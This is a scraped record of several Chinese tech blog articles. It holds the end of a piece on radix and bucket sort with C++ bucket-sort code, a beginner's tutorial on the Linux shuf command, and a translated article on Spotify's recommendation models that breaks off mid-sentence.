,0,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,下图给出了对{ 329, 457, 657, 839, 436, 720, 355 }进行基数排序的简单演示过程,\n,\n,基数排序的时间复杂度是O(n * dn)，其中n是待排序元素个数，dn是数字位数。这个时间复杂度不一定优于O(n log n)，dn的大小取决于数字位的选择（比如比特位数），和待排序数据所属数据类型的全集的大小；dn决定了进行多少轮处理，而n是每轮处理的操作数目。,\n,如果考虑和比较排序进行对照，基数排序的形式复杂度虽然不一定更小，但由于不进行比较，因此其基本操作的代价较小，而且如果适当的选择基数，dn一般不大于log n，所以基数排序一般要快过基于比较的排序，比如快速排序。由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序并不是只能用于整数排序。,\n,　　,桶排序(Bucket Sort),\n,桶排序也叫箱排序。工作的原理是将数组元素映射到有限数量个桶里，利用计数排序可以定位桶的边界，每个桶再各自进行桶内排序（使用其它排序算法或以递归方式继续使用桶排序）。,\n,桶排序的实现代码如下：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#include<iostream>\r\nusing namespace std;\r\n\r\n// 分类 ------------- 内部非比较排序\r\n// 数据结构 --------- 数组\r\n// 最差时间复杂度 ---- O(nlogn)或O(n^2)，只有一个桶，取决于桶内排序方式\r\n// 最优时间复杂度 ---- O(n)，每个元素占一个桶\r\n// 平均时间复杂度 ---- O(n)，保证各个桶内元素个数均匀即可\r\n// 所需辅助空间 ------ O(n + bn)\r\n// 稳定性 ----------- 稳定\r\n\r\n/* 本程序用数组模拟桶 */\r\nconst int bn = 5;    // 这里排序[0,49]的元素，使用5个桶就够了，也可以根据输入动态确定桶的数量\r\nint C[bn];           // 计数数组，存放桶的边界信息\r\n\r\nvoid InsertionSort(int A[], int left, int right)\r\n{\r\n    for (int i = left + 1; i <= right; i++)  // 从第二张牌开始抓，直到最后一张牌\r\n    {\r\n        int get = A[i];\r\n        int j = i - 1;\r\n        while (j >= left && A[j] > get)\r\n        {\r\n            A[j + 1] = A[j];\r\n            j--;\r\n        }\r\n        A[j + 1] = get;\r\n    }\r\n}\r\n\r\nint MapToBucket(int x)\r\n{\r\n    return x / 10;    // 映射函数f(x)，作用相当于快排中的Partition，把大量数据分割成基本有序的数据块\r\n}\r\n\r\nvoid CountingSort(int A[], int n)\r\n{\r\n    for (int i = 0; i < bn; i++)\r\n    {\r\n        C[i] = 0;\r\n    }\r\n    for (int i = 0; i < n; i++)     // 使C[i]保存着i号桶中元素的个数\r\n    {\r\n        C[MapToBucket(A[i])]++;\r\n    }\r\n    for (int i = 1; i < bn; i++)    // 定位桶边界：初始时，C[i]-1为i号桶最后一个元素的位置\r\n    {\r\n        C[i] = C[i] + C[i - 1];\r\n    }\r\n    int *B = (int *)malloc((n) * sizeof(int));\r\n    for (int i = n - 1; i >= 0; i--)// 从后向前扫描保证计数排序的稳定性(重复元素相对次序不变)\r\n    {\r\n        int b = MapToBucket(A[i]);  // 元素A[i]位于b号桶\r\n        B[--C[b]] = A[i];           // 把每个元素A[i]放到它在输出数组B中的正确位置上\r\n                                    // 桶的边界被更新：C[b]为b号桶第一个元素的位置\r\n    }\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        A[i] = B[i];\r\n    }\r\n    free(B);\r\n}\r\n\r\nvoid BucketSort(int A[], int n)\r\n{\r\n    CountingSort(A, n);          // 利用计数排序确定各个桶的边界（分桶）\r\n    for (int i = 0; i < bn; i++) // 对每一个桶中的元素应用插入排序\r\n    {\r\n        int left = C[i];         // C[i]为i号桶第一个元素的位置\r\n        int right = (i == bn - 1 ? n - 1 : C[i + 1] - 1);// C[i+1]-1为i号桶最后一个元素的位置\r\n        if (left < right)        // 对元素个数大于1的桶进行桶内插入排序\r\n            InsertionSort(A, left, right);\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 29, 25, 3, 49, 9, 37, 21, 43 };// 针对桶排序设计的输入\r\n    int n = sizeof(A) / sizeof(int);\r\n    BucketSort(A, n);\r\n    printf(\"桶排序结果：\");\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#include<iostream>,using ,namespace, ,std,;, ,// 分类 ------------- 内部非比较排序,// 数据结构 --------- 数组,// 最差时间复杂度 ---- O(nlogn)或O(n^2)，只有一个桶，取决于桶内排序方式,// 最优时间复杂度 ---- O(n)，每个元素占一个桶,// 平均时间复杂度 ---- O(n)，保证各个桶内元素个数均匀即可,// 所需辅助空间 ------ O(n + bn),// 稳定性 ----------- 稳定, ,/* 本程序用数组模拟桶 */,const, ,int, ,bn, ,=, ,5,;,    ,// 这里排序[0,49]的元素，使用5个桶就够了，也可以根据输入动态确定桶的数量,int, ,C,[,bn,],;,           ,// 计数数组，存放桶的边界信息, ,void, ,InsertionSort,(,int, ,A,[,],,, ,int, ,left,,, ,int, ,right,),{,    ,for, ,(,int, ,i, ,=, ,left, ,+, ,1,;, ,i, ,<=, ,right,;, ,i,++,),  ,// 从第二张牌开始抓，直到最后一张牌,    ,{,        ,int, ,get, ,=, ,A,[,i,],;,        ,int, ,j, ,=, ,i, ,-, ,1,;,        ,while, ,(,j, ,>=, ,left, ,&&, ,A,[,j,], ,>, ,get,),        ,{,            ,A,[,j, ,+, ,1,], ,=, ,A,[,j,],;,            ,j,--,;,        ,},        ,A,[,j, ,+, ,1,], ,=, ,get,;,    ,},}, ,int, ,MapToBucket,(,int, ,x,),{,    ,return, ,x, ,/, ,10,;,    ,// 映射函数f(x)，作用相当于快排中的Partition，把大量数据分割成基本有序的数据块,}, ,void, ,CountingSort,(,int, ,A,[,],,, ,int, ,n,),{,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,bn,;, ,i,++,),    ,{,        ,C,[,i,], ,=, ,0,;,    ,},    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),     ,// 使C[i]保存着i号桶中元素的个数,    ,{,        ,C,[,MapToBucket,(,A,[,i,],),],++,;,    ,},    ,for, ,(,int, ,i, ,=, ,1,;, ,i, ,<, ,bn,;, ,i,++,),    ,// 定位桶边界：初始时，C[i]-1为i号桶最后一个元素的位置,    ,{,        ,C,[,i,], ,=, ,C,[,i,], ,+, ,C,[,i, ,-, ,1,],;,    ,},    ,int, ,*,B, ,=, ,(,int, ,*,),malloc,(,(,n,), ,*, ,sizeof,(,int,),),;,    ,for, ,(,int, ,i, ,=, ,n, ,-, ,1,;, ,i, ,>=, ,0,;, ,i,--,),// 从后向前扫描保证计数排序的稳定性(重复元素相对次序不变),    ,{,        ,int, ,b, ,=, ,MapToBucket,(,A,[,i,],),;,  ,// 元素A[i]位于b号桶,        ,B,[,--,C,[,b,],], ,=, ,A,[,i,],;,           ,// 把每个元素A[i]放到它在输出数组B中的正确位置上,                                    ,// 桶的边界被更新：C[b]为b号桶第一个元素的位置,    ,},    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,A,[,i,], ,=, ,B,[,i,],;,    ,},    ,free,(,B,),;,}, ,void, ,BucketSort,(,int, ,A,[,],,, ,int, ,n,),{,    ,CountingSort,(,A,,, ,n,),;,          ,// 利用计数排序确定各个桶的边界（分桶）,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,bn,;, ,i,++,), ,// 对每一个桶中的元素应用插入排序,    ,{,        ,int, ,left, ,=, ,C,[,i,],;,         ,// C[i]为i号桶第一个元素的位置,        ,int, ,right, ,=, ,(,i, ,==, ,bn, ,-, ,1, ,?, ,n, ,-, ,1, ,:, ,C,[,i, ,+, ,1,], ,-, ,1,),;,// C[i+1]-1为i号桶最后一个元素的位置,        ,if, ,(,left, ,<, ,right,),        ,// 对元素个数大于1的桶进行桶内插入排序,            ,InsertionSort,(,A,,, ,left,,, ,right,),;,    ,},}, ,int, ,main,(,),{,    ,int, ,A,[,], ,=, ,{, ,29,,, ,25,,, ,3,,, ,49,,, ,9,,, ,37,,, ,21,,, ,43, ,},;,// 针对桶排序设计的输入,    ,int, ,n, ,=, ,sizeof,(,A,), ,/, ,sizeof,(,int,),;,    ,BucketSort,(,A,,, ,n,),;,    ,printf,(,\"桶排序结果：\",),;,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,printf,(,\"%d \",,, ,A,[,i,],),;,    ,},    ,printf,(,\"\\n\",),;,    ,return, ,0,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,下图给出了对{ 29, 25, 3, 49, 9, 37, 21, 43 }进行桶排序的简单演示过程,\n,\n,桶排序不是比较排序，不受到O(nlogn)下限的影响，它是鸽巢排序的一种归纳结果，当所要排序的数组值分散均匀的时候，桶排序拥有线性的时间复杂度。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 5 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113977/", "url_object_id": "b56537dc0b776f7afb12d3ecdd87b33c", "front_image_path": "full/506f77aba037cb2bd78064b80470760038a6d491.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "title": "给初学者看的 shuf 命令教程", "create_time": "2018/05/14", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Sk,   译文出处：,Linux中国/geekpi,   ,shuf, 命令用于在类 Unix 操作系统中生成随机排列。使用 ,shuf, 命令，我们可以随机打乱给定输入文件的行。,shuf, 命令是 GNU Coreutils 的一部分，因此你不必担心安装问题。在这个简短的教程中，让我向你展示一些 ,shuf, 命令的例子。,\n,\n,带例子的 shuf 命令教程,\n,我有一个名为 ,ostechnix.txt, 的文件，内容如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cat ostechnix.txt\r\nline1\r\nline2\r\nline3\r\nline4\r\nline5\r\nline6\r\nline7\r\nline8\r\nline9\r\nline10\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cat ,ostechnix,.,txt,line1,line2,line3,line4,line5,line6,line7,line8,line9,line10, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在让我们以随机顺序显示上面的行。为此，请运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ shuf ostechnix.txt\r\nline2\r\nline8\r\nline5\r\nline10\r\nline7\r\nline1\r\nline4\r\nline6\r\nline9\r\nline3\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,shuf ,ostechnix,.,txt,line2,line8,line5,line10,line7,line1,line4,line6,line9,line3, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,看到了吗？上面的命令将名为 ,ostechnix.txt, 中的行随机排列并输出了结果。,\n,你可能想将输出写入另一个文件。例如，我想将输出保存到 ,output.txt, 中。为此，请先创建 ,output.txt,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ touch output.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,touch ,output,.,txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,然后，像下面使用 ,-o, 标志将输出写入该文件：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ shuf ostechnix.txt -o output.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,shuf ,ostechnix,.,txt, ,-,o, ,output,.,txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,上面的命令将随机随机打乱 ,ostechnix.txt, 的内容并将输出写入 ,output.txt,。你可以使用命令查看 ,output.txt, 的内容：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ cat output.txt\r\n\r\nline2\r\nline8\r\nline9\r\nline10\r\nline1\r\nline3\r\nline7\r\nline6\r\nline4\r\nline5\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,cat ,output,.,txt, ,line2,line8,line9,line10,line1,line3,line7,line6,line4,line5, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我只想显示文件中的任意一行。我该怎么做？很简单！,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ shuf -n 1 ostechnix.txt\r\nline6\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,shuf, ,-,n, ,1, ,ostechnix,.,txt,line6, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,同样，我们可以选择前 “n” 个随机条目。以下命令将只显示前五个随机条目：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ shuf -n 5 ostechnix.txt\r\nline10\r\nline4\r\nline5\r\nline9\r\nline3\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,shuf, ,-,n, ,5, ,ostechnix,.,txt,line10,line4,line5,line9,line3, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如下所示，我们可以直接使用 ,-e, 标志传入输入，而不是从文件中读取行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ shuf -e line1 line2 line3 line4 line5\r\nline1\r\nline3\r\nline5\r\nline4\r\nline2\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,shuf, ,-,e, ,line1 ,line2 ,line3 ,line4 ,line5,line1,line3,line5,line4,line2, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你也可以传入数字：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ shuf -e 1 2 3 4 5\r\n3\r\n5\r\n1\r\n4\r\n2\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,shuf, ,-,e, ,1, ,2, ,3, ,4, ,5,3,5,1,4,2, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,要快速在给定范围选择一个，请改用此命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ shuf -n 1 -e 1 2 3 4 5\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,shuf, ,-,n, ,1, ,-,e, ,1, ,2, ,3, ,4, ,5, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,或者，选择下面的任意三个随机数字：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ shuf -n 3 -e 1 2 3 4 5\r\n3\r\n5\r\n1\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,shuf, ,-,n, ,3, ,-,e, ,1, ,2, ,3, ,4, ,5,3,5,1, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我们也可以在特定范围内生成随机数。例如，要显示 1 到 10 之间的随机数，只需使用：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ shuf -i 1-10\r\n1\r\n9\r\n8\r\n2\r\n4\r\n7\r\n6\r\n3\r\n10\r\n5\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,shuf, ,-,i, ,1,-,10,1,9,8,2,4,7,6,3,10,5, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,有关更多详细信息，请参阅手册页。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ man shuf\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,man ,shuf, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,今天就是这些。还有更多更好的东西。敬请关注！,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113985/", "url_object_id": "6dc6e928199fafa86ce672b2bf1253e2", "front_image_path": "full/d1b17b98748a74826464a08e6d30a4ee1b15b171.jpg"},{"front_image_url": ["http://wx2.sinaimg.cn/large/7cc829d3gy1fq7l3ts6p3j20ps0ocq78.jpg"], "title": "机器学习如何发现你喜欢的音乐", "create_time": "2018/04/13", "vote": "1", "bookmark": "4", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文由 ,伯乐在线, - ,XiaofengYue_DXY, 翻译，,艾凌风, 校稿。未经许可，禁止转载！,英文出处：,Sophia Ciocca,。欢迎加入,翻译组,。,机器学习如何发现你喜欢的音乐：音乐个性化推荐背后的科学原理,\n,本周一，正如其它每个周一，一亿多 Spotify 用户每人都收到了一个崭新的歌单。这个叫做每周发现的歌单内混合了用户从未听过但是可能会喜欢的 30首歌曲。效果堪称神奇。,\n,我自己是 Spotify 的超级粉丝，对每周发现尤其喜爱。为什么呢？因为我觉得它懂我。它比我生命中的任何人都更清楚我的音乐品味。我很高兴每周它都能满足我的需求，一如既往地推荐一些我自己永远都不会找到或知道会喜欢的歌曲。,\n,对于那些两耳不闻窗外事的人们，请允许我介绍一下我的虚拟好友：,\n,\n,[图片说明: 我的 Spotify 每周发现歌单],\n,没想到，在这方面我不是一个人，不光是我对每周发现如此着迷 – 整个用户群体都趋之若鹜。这股热潮使得 Spotify 重新调整了它的重心，并在基于算法的歌单上投入了更多的资源。,\n,\n,Dave Howitz: @Spotfiy 每周发现的歌单对我的了解程度简直毛骨悚然，熟悉到就像一个曾经与我有过一起濒死体验的前女友一样。,\n,Amanda Whitbred: 现在 @Spotify 的每周发现对我已经了解到如果它现在求婚，我也会说同意的地步了。,\n,自「每周发现」在 2015 年第一次上线以来，我就迫切想知道它是怎么运作的（而且由于我是 Spotify 公司的迷妹，我喜欢假装在那里工作并研究他们的产品）。 经过三周的疯狂Google，我终于满怀感恩地获取了一些幕后的知识。,\n,所以 Spotify 到底是如何成功做到给每人每周挑选 30 首歌曲的？我们先来仔细看下其它的音乐服务是如何做音乐推荐，以及 Spotify 是如何更胜一筹的。,\n, ,\n,在线音乐甄选服务简史,\n,\n,早在千禧年之初，Songza 就开始使用手动甄选为用户提供歌单。手动甄选的意思就是所谓的音乐专家或者其他编辑会手动挑选一些他们自己认为不错的音乐做成歌单，然后听众可以直接拿来听。（稍后，Beats 音乐也采取了同样的策略）。手动甄选效果尚可，但是由于这种方法只是纯手工挑选，方式方法也比较简单，它并不能照顾到每个听众音乐品味的微妙差异。,\n,跟 Songza 一样， Pandora 也是音乐甄选服务领域的早期玩家之一。它使用了一个略为更高级的方法来代替给歌曲属性手工打标签。即大众在听音乐的时候，对每首歌曲挑选一些描述性的词语来作为标签。进而，Pandora 的程序可以直接过滤特定的标签来生成包含相似歌曲的歌单。,\n,差不多同一时间，一个隶属于麻省理工学院媒体实验室的名叫 The Echo Nest 的音乐信息机构，采用了一个完全不同的高级策略来定制音乐。The Echo Nest 使用算法来分析音频和音乐的文本内容，以完成音乐识别，个性化推荐，歌单创建和分析等。,\n,最后，是 Last.fm 另辟蹊径，采取了另一个沿用至今的策略。那就是利用协同过滤来识别用户可能喜欢的音乐。稍后本文会展开讨论更多这方面的内容。,\n,所以说既然其他的音乐甄选服务都实现了推荐功能，Spotify 究竟是怎么操作自己的神奇引擎，来实现甩出竞争对手几条街的用户品味默契度的呢？,\n, ,\n,Spotify 的三种推荐模型,\n,事实上 Spotify 并没有使用什么单一的革命性推荐模型，而是,混合了一些其他公司使用的最好的策略来创建他们自己独一无二的强大发现引擎。,\n,Spotify 使用三种主要的推荐模型来创建每周发现：,\n,\n,协同过滤模型,（即 Last.fm 最早使用的那些模型）。工作原理为分析你和,其他,用户的行为。,\n,自然语言处理（NLP）,模型 。工作原理为分析文本。,\n,音频,模型。工作原理为分析,原始音频声道本身,。,\n,\n,\n,我们来具体看下这些推荐模型是怎么工作的！,\n,推荐模型之一：协同过滤,\n,\n,首先介绍下背景：当很多人听到协同过滤这几个词的时候，他们会立刻联想到 ,Netflix,，因为它是第一个利用协同过滤来实现推荐模型的公司之一。其做法主要是使用用户提交的电影星级来计算推荐那些电影给其他,类似的,用户。,\n,自 ,Netflix ,将其成功应用以来，协同过滤开始快速流传开来。现在无论是谁想实现一个推荐模型的话，一般都会拿它作为初次尝试。,\n,与,Netflix,不同的是，Spotify 并没有用户对他们音乐的星级评价数据。Spotify 所用的数据是,隐形反馈,的，具体来说就是我们在线听歌的,歌曲次数,，以及其他额外信息，诸如用户是否保存歌曲到个人歌单，或者听完歌曲后是否接着访问艺术家主页等。,\n,但什么是协同过滤，到底它是如何工作的呢？下面用一段简短对话来做一个大致的介绍。,\n,\n,啥情况? 原来这俩人里面每人都有自己的一些歌曲偏好 – 左边的人喜欢歌曲 P, Q, R 和 S; 右边的人喜欢 Q, R, S 和 T。,\n,协同过滤系统进而利用这些数据得出结论，,\n,“,嗯。既然你俩都喜欢相同的歌曲 – Q,，R ,和 S – ,那么你们可能是类似的用户。所以你们应该会喜欢另一个人听过但是你还没有听过的歌曲。”,\n,系统然后建议右边的人去体验下歌曲 P，以及左边的人去体验下歌曲 T。听起来够简单吧？,\n,但是 Spotify 具体是怎么具体应用这个概念，来计算,基于百万级,的用户偏好从而得出,数以百万计,的用户歌曲推荐呢？,\n, ,\n,…矩阵运算，用 Python 库即可实现,\n,\n,现实中，此处提及的矩阵是极其庞大的。,每行都代表了, Spotify ,的一亿四千万用户中的一员,（如果你也用 Spotify，那么你也是这个矩阵中的一行），而每一列则代表了 Spotify 数据库中,三亿首歌曲,中的一首。,\n,然后，Python 库就开始跑这个漫长而复杂的矩阵分解公式：,\n,\n,计算完成后，系统会生成两种类型的向量，在此分别命名为 X 和 Y。X 为用户向量，代表单个用户的音乐品味。Y 则为歌曲向量，代表单支歌曲的特征。,\n,\n,现在我们得到了一亿四千万个用户向量，每人一个，还有三亿歌曲向量。这些向量的具体内容只是一些单独拎出来自身并无意义的数字，但是在后面进行比较时会非常有用。,\n,为了找到那些跟我相似品味的用户，协同过滤系统会拿我的向量跟其他用户的向量作比较，最终会找到那些跟我最相似的用户。对于 Y 向量，也是同样的流程 – 你可以拿一首歌的向量与其他的歌曲向量做比较，进而找出哪些歌曲是跟你现在正在看的歌曲最相似。,\n,协同过滤确实效果不错，但是 Spotify 深知再添加另外一个引擎的话效果会更出色。这就到了自然语言处理出场的时候了。,\n, ,\n,推荐模型之二：自然语言处理,\n,Spotify 采用的第二个推荐模型就是,自然语言处理,。这些模型的源数据，正如名字所示，就是一些普通的,语言文字, – 例如歌曲的元数据，新闻文章，博客，和互联网上的其它文本等。,\n,\n, ,\n,自然语言处理 – 计算机理解人类语言的能力 – 本身就是一个巨大的领域，通常通过情感分析应用编程接口（API）来进行操作处理。,\n,自然语言处理背后的具体原理超出了本文的讨论范畴，但是在此本文可以提供一些粗略的描述：Spotify 会在网上不断爬取博客帖子以及其它音乐相关的文本，并找出人们对特定的艺术家和歌曲的评论 – 比如说人们对这些歌曲经常使用哪些形容词和语言, 以及哪些其他艺术家和歌曲也会和它们放在一起讨论。,\n,虽然我不知道 Spotify 如何处理他们抓取的数据，但是我可以介绍下 The Echo Nest 是如何使用它们的。他们会把数据分类成“文化向量”和“最佳评语集”。每个艺术家和歌曲都有数以千计的每日更新的最佳评语集。每个评语都有一个相关的权重，来表示其描述的重要性（简单说就是某人可能会用该评语描述某个音乐的概率）。,\n,\n,[ “Cultural vectors”, or “top terms”, as used by the Echo Nest. Table from Brian Whitman],\n,然后，与协同过滤类似，自然语言处理模型用这些评语和权重来创建一个歌曲的表达向量，可以用来确定两首音乐是否相似。很酷吧？,\n, ,\n,推荐模型之三：原始音频模型,\n,\n,首先，你可能会问这个问题：,\n,但是，Sophia,，我们已经从前两种模型中获取了这么多数据！为什么还要继续分析音频本身呢？,\n,额，首先要说的是，引入第三个模型会进一步提高这个已经很优秀的推荐服务的准确性。但实际上，采用这个模型还有另外一个次要目的：,原始音频模型会把新歌考虑进来。,\n,比如说，你的创作歌手朋友在 Spotify 上刚放上了一首新歌。可能它只有 50 次听歌记录，所以很少能有其他听众来一起协同过滤它。与此同时，它也在网上也没有留下多少痕迹，所以自然语言处理模型也不会注意到它。幸运的是，原始音频模型并不区分新歌曲和热门歌曲。所以有了它的帮忙，你朋友的歌曲也可以和流行歌曲一道出现在每周发现的歌单里面。,\n,好了，到了“如何”的部分了。我们如何才能分析这些看起来如此抽象的,原始音频数据,呢？,\n,…用,卷积神经网络！,\n,卷积神经网络同样也是支撑面部识别的技术。只不过在 Spotify 的案例中，他们被稍作修改以基于音频数据处理而不是像素点。下面是一个神经网络架构的例子：,\n,\n,[,Image credit: Sander Dieleman,],\n,这个特定的神经网络有四个,卷积层,，具体为图中左侧的宽柱，和右边的稍微窄些的三根柱。输入是音频帧的时频表示，进而连接起来形成频谱图。,\n,音频帧会穿过这些卷积层，经过最后一个卷积层，你可以看到一个“全局临时池”层。该层在整个时间轴上汇集数据，并有效计算和统计歌曲时长内的学习特征。,\n,处理完之后，神经网络会得出其对歌曲的理解，包括估计的,时间签名，音调，调式，拍子及音量,等特征。下面就是 Draft Punk 的 “Around the World” 30 秒片段的数据图。,\n,\n,[Image Credit: ,Tristan Jehan & David DesRoches (The Echo Nest),],\n,最终，对这些对歌曲关键特征的理解可以让 Spotify 